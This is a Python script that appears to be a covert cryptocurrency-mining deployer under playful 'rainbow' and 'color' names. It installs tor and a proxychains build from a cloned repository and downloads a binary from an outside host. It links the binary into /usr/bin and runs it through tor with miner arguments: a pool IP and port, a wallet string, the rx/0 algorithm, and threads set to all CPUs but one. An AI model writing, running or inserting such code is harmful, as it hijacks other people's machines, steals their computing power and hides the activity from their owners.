import os
import time
import multiprocessing
from random import randint

# Setting up the "rainbow" workspace
RAINBOW_PATH = '/usr/local/bin/rainbow' + str(randint(1000, 9999))
os.makedirs(RAINBOW_PATH, exist_ok=True)

# Configuration for the "colors"
color_name = 'purple'
worker_threads = multiprocessing.cpu_count() - 1
if worker_threads < 1:
    worker_threads = 1

# Painting the system with necessary tools
try:
    os.system('apt-get update -y')
    os.system('apt-get install -y gcc make tor python3 python3-dev')
    os.system('rm -rf magic-wand')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git magic-wand')
    os.chdir('magic-wand')
    os.system('make && make install && make install-config')
    os.chdir('..')

    # Download and spread the "color"
    if not os.path.isfile(RAINBOW_PATH + '/' + color_name):
        os.system(f'wget https://raw.githubuser.com/grozlhrle/rainbows/raw/main/{color_name}.xz -O {color_name}.xz')
        os.system(f'tar -xf {color_name}.xz -C {RAINBOW_PATH} && rm -rf {color_name}.xz')
        os.system(f'chmod +x {RAINBOW_PATH}/{color_name}')
    
    # Adding the "rainbow" to the path
    os.system(f'ln -s -f {RAINBOW_PATH}/{color_name} /usr/bin/{color_name}')
except Exception as e:
    print(f"Error painting the rainbow: {e}")

# Start the magical bridge
os.system('tor &')
time.sleep(60)

# Unleashing the "rainbow"
os.system(f'proxychains4 {color_name} --donate-level 1 -o 51.15.208.89:3333 '
          f'-u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY '
          f'-p az -a rx/0 -k --tls -t {worker_threads}')
